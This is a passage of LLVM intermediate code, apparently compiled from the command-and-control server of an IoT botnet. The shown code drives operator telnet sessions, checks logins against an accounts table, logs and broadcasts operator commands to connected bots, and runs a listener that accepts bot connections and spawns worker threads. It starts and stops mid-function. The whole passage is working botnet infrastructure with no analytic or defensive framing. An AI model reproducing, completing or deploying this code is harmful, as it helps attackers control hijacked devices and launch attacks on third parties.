  %246 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %247 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %248 = call i64 @strlen(i8* %247) #8
  %249 = call i64 @send(i32 %245, i8* %246, i64 %248, i32 16384)
  %250 = icmp eq i64 %249, -1
  br i1 %250, label %251, label %252

251:                                              ; preds = %244
  br label %557

252:                                              ; preds = %244
  %253 = load i32, i32* %4, align 4
  %254 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %255 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %256 = call i64 @strlen(i8* %255) #8
  %257 = call i64 @send(i32 %253, i8* %254, i64 %256, i32 16384)
  %258 = icmp eq i64 %257, -1
  br i1 %258, label %259, label %260

259:                                              ; preds = %252
  br label %557

260:                                              ; preds = %252
  %261 = load i32, i32* %4, align 4
  %262 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %263 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %264 = call i64 @strlen(i8* %263) #8
  %265 = call i64 @send(i32 %261, i8* %262, i64 %264, i32 16384)
  %266 = icmp eq i64 %265, -1
  br i1 %266, label %267, label %268

267:                                              ; preds = %260
  br label %557

268:                                              ; preds = %260
  %269 = load i32, i32* %4, align 4
  %270 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %271 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %272 = call i64 @strlen(i8* %271) #8
  %273 = call i64 @send(i32 %269, i8* %270, i64 %272, i32 16384)
  %274 = icmp eq i64 %273, -1
  br i1 %274, label %275, label %276

275:                                              ; preds = %268
  br label %557

276:                                              ; preds = %268
  br label %277

277:                                              ; preds = %276
  %278 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i64 0, i64 0
  %279 = load i32, i32* %5, align 4
  %280 = sext i32 %279 to i64
  %281 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %280
  %282 = getelementptr inbounds %struct.login_info, %struct.login_info* %281, i32 0, i32 0
  %283 = getelementptr inbounds [100 x i8], [100 x i8]* %282, i64 0, i64 0
  %284 = call i32 (i8*, i8*, ...) @sprintf(i8* %278, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.28, i64 0, i64 0), i8* %283) #9
  %285 = load i32, i32* %4, align 4
  %286 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i64 0, i64 0
  %287 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i64 0, i64 0
  %288 = call i64 @strlen(i8* %287) #8
  %289 = call i64 @send(i32 %285, i8* %286, i64 %288, i32 16384)
  %290 = icmp eq i64 %289, -1
  br i1 %290, label %291, label %292

291:                                              ; preds = %277
  br label %557

292:                                              ; preds = %277
  br label %293

293:                                              ; preds = %292
  %294 = load i8*, i8** %3, align 8
  %295 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %294) #9
  %296 = load i32, i32* %4, align 4
  %297 = sext i32 %296 to i64
  %298 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %297
  %299 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %298, i32 0, i32 0
  store i32 1, i32* %299, align 4
  br label %300

300:                                              ; preds = %523, %522, %501, %376, %293
  %301 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %302 = load i32, i32* %4, align 4
  %303 = call i32 @fdgets(i8* %301, i32 2048, i32 %302)
  %304 = icmp sgt i32 %303, 0
  br i1 %304, label %305, label %556

305:                                              ; preds = %300
  %306 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %307 = call i32 @strncmp(i8* %306, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.29, i64 0, i64 0), i64 4) #8
  %308 = icmp eq i32 %307, 0
  br i1 %308, label %317, label %309

309:                                              ; preds = %305
  %310 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %311 = call i32 @strncmp(i8* %310, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i64 0, i64 0), i64 4) #8
  %312 = icmp eq i32 %311, 0
  br i1 %312, label %317, label %313

313:                                              ; preds = %309
  %314 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %315 = call i32 @strncmp(i8* %314, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0), i64 4) #8
  %316 = icmp eq i32 %315, 0
  br i1 %316, label %317, label %377

317:                                              ; preds = %313, %309, %305
  %318 = load i8*, i8** %3, align 8
  %319 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %318) #9
  %320 = getelementptr inbounds [800 x i8], [800 x i8]* %32, i64 0, i64 0
  %321 = call i32 (i8*, i8*, ...) @sprintf(i8* %320, i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.32, i64 0, i64 0)) #9
  %322 = getelementptr inbounds [800 x i8], [800 x i8]* %33, i64 0, i64 0
  %323 = call i32 (i8*, i8*, ...) @sprintf(i8* %322, i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.33, i64 0, i64 0)) #9
  %324 = getelementptr inbounds [800 x i8], [800 x i8]* %34, i64 0, i64 0
  %325 = call i32 (i8*, i8*, ...) @sprintf(i8* %324, i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.34, i64 0, i64 0)) #9
  %326 = getelementptr inbounds [800 x i8], [800 x i8]* %35, i64 0, i64 0
  %327 = call i32 (i8*, i8*, ...) @sprintf(i8* %326, i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.35, i64 0, i64 0)) #9
  %328 = load i32, i32* %4, align 4
  %329 = getelementptr inbounds [800 x i8], [800 x i8]* %32, i64 0, i64 0
  %330 = getelementptr inbounds [800 x i8], [800 x i8]* %32, i64 0, i64 0
  %331 = call i64 @strlen(i8* %330) #8
  %332 = call i64 @send(i32 %328, i8* %329, i64 %331, i32 16384)
  %333 = icmp eq i64 %332, -1
  br i1 %333, label %334, label %335

334:                                              ; preds = %317
  br label %557

335:                                              ; preds = %317
  %336 = load i32, i32* %4, align 4
  %337 = getelementptr inbounds [800 x i8], [800 x i8]* %33, i64 0, i64 0
  %338 = getelementptr inbounds [800 x i8], [800 x i8]* %33, i64 0, i64 0
  %339 = call i64 @strlen(i8* %338) #8
  %340 = call i64 @send(i32 %336, i8* %337, i64 %339, i32 16384)
  %341 = icmp eq i64 %340, -1
  br i1 %341, label %342, label %343

342:                                              ; preds = %335
  br label %557

343:                                              ; preds = %335
  %344 = load i32, i32* %4, align 4
  %345 = getelementptr inbounds [800 x i8], [800 x i8]* %34, i64 0, i64 0
  %346 = getelementptr inbounds [800 x i8], [800 x i8]* %34, i64 0, i64 0
  %347 = call i64 @strlen(i8* %346) #8
  %348 = call i64 @send(i32 %344, i8* %345, i64 %347, i32 16384)
  %349 = icmp eq i64 %348, -1
  br i1 %349, label %350, label %351

350:                                              ; preds = %343
  br label %557

351:                                              ; preds = %343
  %352 = load i32, i32* %4, align 4
  %353 = getelementptr inbounds [800 x i8], [800 x i8]* %35, i64 0, i64 0
  %354 = getelementptr inbounds [800 x i8], [800 x i8]* %35, i64 0, i64 0
  %355 = call i64 @strlen(i8* %354) #8
  %356 = call i64 @send(i32 %352, i8* %353, i64 %355, i32 16384)
  %357 = icmp eq i64 %356, -1
  br i1 %357, label %358, label %359

358:                                              ; preds = %351
  br label %557

359:                                              ; preds = %351
  %360 = load i8*, i8** %3, align 8
  %361 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %360) #9
  %362 = getelementptr inbounds [5000 x i8], [5000 x i8]* %36, i64 0, i64 0
  %363 = load i32, i32* %5, align 4
  %364 = sext i32 %363 to i64
  %365 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %364
  %366 = getelementptr inbounds %struct.login_info, %struct.login_info* %365, i32 0, i32 0
  %367 = getelementptr inbounds [100 x i8], [100 x i8]* %366, i64 0, i64 0
  %368 = call i32 (i8*, i8*, ...) @sprintf(i8* %362, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.28, i64 0, i64 0), i8* %367) #9
  %369 = load i32, i32* %4, align 4
  %370 = getelementptr inbounds [5000 x i8], [5000 x i8]* %36, i64 0, i64 0
  %371 = getelementptr inbounds [5000 x i8], [5000 x i8]* %36, i64 0, i64 0
  %372 = call i64 @strlen(i8* %371) #8
  %373 = call i64 @send(i32 %369, i8* %370, i64 %372, i32 16384)
  %374 = icmp eq i64 %373, -1
  br i1 %374, label %375, label %376

375:                                              ; preds = %359
  br label %557

376:                                              ; preds = %359
  br label %300, !llvm.loop !19

377:                                              ; preds = %313
  %378 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %379 = call i32 @strncmp(i8* %378, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i64 0, i64 0), i64 5) #8
  %380 = icmp eq i32 %379, 0
  br i1 %380, label %393, label %381

381:                                              ; preds = %377
  %382 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %383 = call i32 @strncmp(i8* %382, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.37, i64 0, i64 0), i64 5) #8
  %384 = icmp eq i32 %383, 0
  br i1 %384, label %393, label %385

385:                                              ; preds = %381
  %386 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %387 = call i32 @strncmp(i8* %386, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.38, i64 0, i64 0), i64 3) #8
  %388 = icmp eq i32 %387, 0
  br i1 %388, label %393, label %389

389:                                              ; preds = %385
  %390 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %391 = call i32 @strncmp(i8* %390, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i64 0, i64 0), i64 3) #8
  %392 = icmp eq i32 %391, 0
  br i1 %392, label %393, label %502

393:                                              ; preds = %389, %385, %381, %377
  %394 = getelementptr inbounds [2048 x i8], [2048 x i8]* %37, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %394, i8 0, i64 2048, i1 false)
  %395 = getelementptr inbounds [2048 x i8], [2048 x i8]* %37, i64 0, i64 0
  %396 = call i32 (i8*, i8*, ...) @sprintf(i8* %395, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.19, i64 0, i64 0)) #9
  %397 = load i32, i32* %4, align 4
  %398 = getelementptr inbounds [2048 x i8], [2048 x i8]* %37, i64 0, i64 0
  %399 = getelementptr inbounds [2048 x i8], [2048 x i8]* %37, i64 0, i64 0
  %400 = call i64 @strlen(i8* %399) #8
  %401 = call i64 @send(i32 %397, i8* %398, i64 %400, i32 16384)
  %402 = icmp eq i64 %401, -1
  br i1 %402, label %403, label %404

403:                                              ; preds = %393
  br label %557

404:                                              ; preds = %393
  %405 = load i32, i32* %4, align 4
  %406 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %407 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %408 = call i64 @strlen(i8* %407) #8
  %409 = call i64 @send(i32 %405, i8* %406, i64 %408, i32 16384)
  %410 = icmp eq i64 %409, -1
  br i1 %410, label %411, label %412

411:                                              ; preds = %404
  br label %557

412:                                              ; preds = %404
  %413 = load i32, i32* %4, align 4
  %414 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %415 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %416 = call i64 @strlen(i8* %415) #8
  %417 = call i64 @send(i32 %413, i8* %414, i64 %416, i32 16384)
  %418 = icmp eq i64 %417, -1
  br i1 %418, label %419, label %420

419:                                              ; preds = %412
  br label %557

420:                                              ; preds = %412
  %421 = load i32, i32* %4, align 4
  %422 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %423 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %424 = call i64 @strlen(i8* %423) #8
  %425 = call i64 @send(i32 %421, i8* %422, i64 %424, i32 16384)
  %426 = icmp eq i64 %425, -1
  br i1 %426, label %427, label %428

427:                                              ; preds = %420
  br label %557

428:                                              ; preds = %420
  %429 = load i32, i32* %4, align 4
  %430 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %431 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %432 = call i64 @strlen(i8* %431) #8
  %433 = call i64 @send(i32 %429, i8* %430, i64 %432, i32 16384)
  %434 = icmp eq i64 %433, -1
  br i1 %434, label %435, label %436

435:                                              ; preds = %428
  br label %557

436:                                              ; preds = %428
  %437 = load i32, i32* %4, align 4
  %438 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %439 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %440 = call i64 @strlen(i8* %439) #8
  %441 = call i64 @send(i32 %437, i8* %438, i64 %440, i32 16384)
  %442 = icmp eq i64 %441, -1
  br i1 %442, label %443, label %444

443:                                              ; preds = %436
  br label %557

444:                                              ; preds = %436
  %445 = load i32, i32* %4, align 4
  %446 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %447 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %448 = call i64 @strlen(i8* %447) #8
  %449 = call i64 @send(i32 %445, i8* %446, i64 %448, i32 16384)
  %450 = icmp eq i64 %449, -1
  br i1 %450, label %451, label %452

451:                                              ; preds = %444
  br label %557

452:                                              ; preds = %444
  %453 = load i32, i32* %4, align 4
  %454 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %455 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %456 = call i64 @strlen(i8* %455) #8
  %457 = call i64 @send(i32 %453, i8* %454, i64 %456, i32 16384)
  %458 = icmp eq i64 %457, -1
  br i1 %458, label %459, label %460

459:                                              ; preds = %452
  br label %557

460:                                              ; preds = %452
  %461 = load i32, i32* %4, align 4
  %462 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %463 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %464 = call i64 @strlen(i8* %463) #8
  %465 = call i64 @send(i32 %461, i8* %462, i64 %464, i32 16384)
  %466 = icmp eq i64 %465, -1
  br i1 %466, label %467, label %468

467:                                              ; preds = %460
  br label %557

468:                                              ; preds = %460
  %469 = load i32, i32* %4, align 4
  %470 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %471 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %472 = call i64 @strlen(i8* %471) #8
  %473 = call i64 @send(i32 %469, i8* %470, i64 %472, i32 16384)
  %474 = icmp eq i64 %473, -1
  br i1 %474, label %475, label %476

475:                                              ; preds = %468
  br label %557

476:                                              ; preds = %468
  %477 = load i32, i32* %4, align 4
  %478 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %479 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %480 = call i64 @strlen(i8* %479) #8
  %481 = call i64 @send(i32 %477, i8* %478, i64 %480, i32 16384)
  %482 = icmp eq i64 %481, -1
  br i1 %482, label %483, label %484

483:                                              ; preds = %476
  br label %557

484:                                              ; preds = %476
  br label %485

485:                                              ; preds = %484
  %486 = getelementptr inbounds [5000 x i8], [5000 x i8]* %38, i64 0, i64 0
  %487 = load i32, i32* %5, align 4
  %488 = sext i32 %487 to i64
  %489 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %488
  %490 = getelementptr inbounds %struct.login_info, %struct.login_info* %489, i32 0, i32 0
  %491 = getelementptr inbounds [100 x i8], [100 x i8]* %490, i64 0, i64 0
  %492 = call i32 (i8*, i8*, ...) @sprintf(i8* %486, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.28, i64 0, i64 0), i8* %491) #9
  %493 = load i32, i32* %4, align 4
  %494 = getelementptr inbounds [5000 x i8], [5000 x i8]* %38, i64 0, i64 0
  %495 = getelementptr inbounds [5000 x i8], [5000 x i8]* %38, i64 0, i64 0
  %496 = call i64 @strlen(i8* %495) #8
  %497 = call i64 @send(i32 %493, i8* %494, i64 %496, i32 16384)
  %498 = icmp eq i64 %497, -1
  br i1 %498, label %499, label %500

499:                                              ; preds = %485
  br label %557

500:                                              ; preds = %485
  br label %501

501:                                              ; preds = %500
  br label %300, !llvm.loop !19

502:                                              ; preds = %389
  %503 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @trim(i8* %503)
  %504 = getelementptr inbounds [5000 x i8], [5000 x i8]* %39, i64 0, i64 0
  %505 = load i32, i32* %5, align 4
  %506 = sext i32 %505 to i64
  %507 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %506
  %508 = getelementptr inbounds %struct.login_info, %struct.login_info* %507, i32 0, i32 0
  %509 = getelementptr inbounds [100 x i8], [100 x i8]* %508, i64 0, i64 0
  %510 = call i32 (i8*, i8*, ...) @sprintf(i8* %504, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.28, i64 0, i64 0), i8* %509) #9
  %511 = load i32, i32* %4, align 4
  %512 = getelementptr inbounds [5000 x i8], [5000 x i8]* %39, i64 0, i64 0
  %513 = getelementptr inbounds [5000 x i8], [5000 x i8]* %39, i64 0, i64 0
  %514 = call i64 @strlen(i8* %513) #8
  %515 = call i64 @send(i32 %511, i8* %512, i64 %514, i32 16384)
  %516 = icmp eq i64 %515, -1
  br i1 %516, label %517, label %518

517:                                              ; preds = %502
  br label %557

518:                                              ; preds = %502
  %519 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %520 = call i64 @strlen(i8* %519) #8
  %521 = icmp eq i64 %520, 0
  br i1 %521, label %522, label %523

522:                                              ; preds = %518
  br label %300, !llvm.loop !19

523:                                              ; preds = %518
  %524 = load i32, i32* %5, align 4
  %525 = sext i32 %524 to i64
  %526 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %525
  %527 = getelementptr inbounds %struct.login_info, %struct.login_info* %526, i32 0, i32 0
  %528 = getelementptr inbounds [100 x i8], [100 x i8]* %527, i64 0, i64 0
  %529 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %530 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.40, i64 0, i64 0), i8* %528, i8* %529)
  %531 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.41, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.42, i64 0, i64 0))
  store %struct._IO_FILE* %531, %struct._IO_FILE** %40, align 8
  %532 = call i64 @time(i64* null) #9
  store i64 %532, i64* %41, align 8
  %533 = call %struct.tm* @gmtime(i64* %41) #9
  store %struct.tm* %533, %struct.tm** %42, align 8
  %534 = getelementptr inbounds [50 x i8], [50 x i8]* %43, i64 0, i64 0
  %535 = load %struct.tm*, %struct.tm** %42, align 8
  %536 = call i64 @strftime(i8* %534, i64 50, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i64 0, i64 0), %struct.tm* %535) #9
  %537 = load %struct._IO_FILE*, %struct._IO_FILE** %40, align 8
  %538 = getelementptr inbounds [50 x i8], [50 x i8]* %43, i64 0, i64 0
  %539 = load i32, i32* %5, align 4
  %540 = sext i32 %539 to i64
  %541 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %540
  %542 = getelementptr inbounds %struct.login_info, %struct.login_info* %541, i32 0, i32 0
  %543 = getelementptr inbounds [100 x i8], [100 x i8]* %542, i64 0, i64 0
  %544 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %545 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %537, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.44, i64 0, i64 0), i8* %538, i8* %543, i8* %544)
  %546 = load %struct._IO_FILE*, %struct._IO_FILE** %40, align 8
  %547 = call i32 @fclose(%struct._IO_FILE* %546)
  %548 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %549 = load i32, i32* %4, align 4
  %550 = load i32, i32* %5, align 4
  %551 = sext i32 %550 to i64
  %552 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %551
  %553 = getelementptr inbounds %struct.login_info, %struct.login_info* %552, i32 0, i32 0
  %554 = getelementptr inbounds [100 x i8], [100 x i8]* %553, i64 0, i64 0
  call void @broadcast(i8* %548, i32 %549, i8* %554)
  %555 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %555, i8 0, i64 2048, i1 false)
  br label %300, !llvm.loop !19

556:                                              ; preds = %300
  br label %557

557:                                              ; preds = %556, %517, %499, %483, %475, %467, %459, %451, %443, %435, %427, %419, %411, %403, %375, %358, %350, %342, %334, %291, %275, %267, %259, %251, %243, %235, %227, %219, %211, %203, %173, %172, %153, %147, %132, %104, %98
  %558 = load i32, i32* %4, align 4
  %559 = sext i32 %558 to i64
  %560 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %559
  %561 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %560, i32 0, i32 0
  store i32 0, i32* %561, align 4
  %562 = load i32, i32* %4, align 4
  %563 = call i32 @close(i32 %562)
  %564 = load volatile i32, i32* @OperatorsConnected, align 4
  %565 = add nsw i32 %564, -1
  store volatile i32 %565, i32* @OperatorsConnected, align 4
  %566 = load i8*, i8** %2, align 8
  ret i8* %566
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #3

declare i32 @fgetc(%struct._IO_FILE*) #1

declare void @rewind(%struct._IO_FILE*) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #3

; Function Attrs: nounwind readonly willreturn
declare i32 @strncmp(i8*, i8*, i64) #2

; Function Attrs: nounwind
declare %struct.tm* @gmtime(i64*) #3

; Function Attrs: nounwind
declare i64 @strftime(i8*, i64, i8*, %struct.tm*) #3

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @BotListener(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i64, align 8
  store i32 %0, i32* %2, align 4
  %9 = call i32 @socket(i32 2, i32 1, i32 0) #9
  store i32 %9, i32* %3, align 4
  %10 = load i32, i32* %3, align 4
  %11 = icmp slt i32 %10, 0
  br i1 %11, label %12, label %13

12:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.45, i64 0, i64 0))
  br label %13

13:                                               ; preds = %12, %1
  %14 = bitcast %struct.sockaddr_in* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %14, i8 0, i64 16, i1 false)
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %15, align 4
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %17 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %16, i32 0, i32 0
  store i32 0, i32* %17, align 4
  %18 = load i32, i32* %2, align 4
  %19 = trunc i32 %18 to i16
  %20 = call zeroext i16 @htons(i16 zeroext %19) #10
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %20, i16* %21, align 2
  %22 = load i32, i32* %3, align 4
  %23 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %24 = call i32 @bind(i32 %22, %struct.sockaddr* %23, i32 16) #9
  %25 = icmp slt i32 %24, 0
  br i1 %25, label %26, label %27

26:                                               ; preds = %13
  call void @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.46, i64 0, i64 0))
  br label %27

27:                                               ; preds = %26, %13
  %28 = load i32, i32* %3, align 4
  %29 = call i32 @listen(i32 %28, i32 5) #9
  store i32 16, i32* %5, align 4
  br label %30

30:                                               ; preds = %27, %37
  %31 = load i32, i32* %3, align 4
  %32 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %33 = call i32 @accept(i32 %31, %struct.sockaddr* %32, i32* %5)
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp slt i32 %34, 0
  br i1 %35, label %36, label %37

36:                                               ; preds = %30
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.47, i64 0, i64 0))
  br label %37

37:                                               ; preds = %36, %30
  %38 = load i32, i32* %4, align 4
  %39 = sext i32 %38 to i64
  %40 = inttoptr i64 %39 to i8*
  %41 = call i32 @pthread_create(i64* %8, %union.pthread_attr_t* null, i8* (i8*)* @BotWorker, i8* %40) #9
  br label %30
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.epoll_event, align 1
  %12 = alloca i8*, align 8
  %13 = alloca i64, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %14 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #9
  %15 = load i32, i32* %5, align 4
  %16 = icmp ne i32 %15, 4
  br i1 %16, label %17, label %23

17:                                               ; preds = %3
  %18 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %19 = load i8**, i8*** %6, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %18, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.48, i64 0, i64 0), i8* %21)
  call void @exit(i32 1) #11
  unreachable

23:                                               ; preds = %3
  %24 = load i8**, i8*** %6, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 3
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @atoi(i8* %26) #8
  store i32 %27, i32* %10, align 4
  %28 = load i8**, i8*** %6, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 2
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 @atoi(i8* %30) #8
  store i32 %31, i32* %9, align 4
  %32 = load i8**, i8*** %6, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 1
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @create_and_bind(i8* %34)
  store volatile i32 %35, i32* @listenFD, align 4
  %36 = load volatile i32, i32* @listenFD, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %39

38:                                               ; preds = %23
  call void @abort() #11
  unreachable

39:                                               ; preds = %23
  %40 = load volatile i32, i32* @listenFD, align 4
  %41 = call i32 @make_socket_non_blocking(i32 %40)
  store i32 %41, i32* %8, align 4
  %42 = load i32, i32* %8, align 4
  %43 = icmp eq i32 %42, -1
  br i1 %43, label %44, label %45

44:                                               ; preds = %39
  call void @abort() #11
  unreachable

45:                                               ; preds = %39
  %46 = load volatile i32, i32* @listenFD, align 4
  %47 = call i32 @listen(i32 %46, i32 4096) #9
  store i32 %47, i32* %8, align 4
  %48 = load i32, i32* %8, align 4
  %49 = icmp eq i32 %48, -1
  br i1 %49, label %50, label %51

50:                                               ; preds = %45
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.49, i64 0, i64 0))
  call void @abort() #11
  unreachable

51:                                               ; preds = %45
  %52 = call i32 @epoll_create1(i32 0) #9
  store volatile i32 %52, i32* @epollFD, align 4
  %53 = load volatile i32, i32* @epollFD, align 4
  %54 = icmp eq i32 %53, -1
  br i1 %54, label %55, label %56

55:                                               ; preds = %51
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.50, i64 0, i64 0))
  call void @abort() #11
  unreachable

